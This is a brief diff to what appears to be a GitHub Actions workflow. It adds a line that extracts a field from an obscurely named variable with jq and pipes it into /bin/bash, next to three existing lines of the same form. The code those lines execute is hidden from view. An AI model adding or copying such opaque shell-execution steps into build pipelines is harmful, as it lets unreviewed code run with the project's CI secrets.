@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$tm3" | jq -r .btrp396 | /bin/bash
           printf '%s' "$qzr547" | jq -r .rhwd07887 | /bin/bash
           printf '%s' "$fbwn70" | jq -r .f1453 | /bin/bash
+          echo $mpu9671 | jq -r .hvqrj2255 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
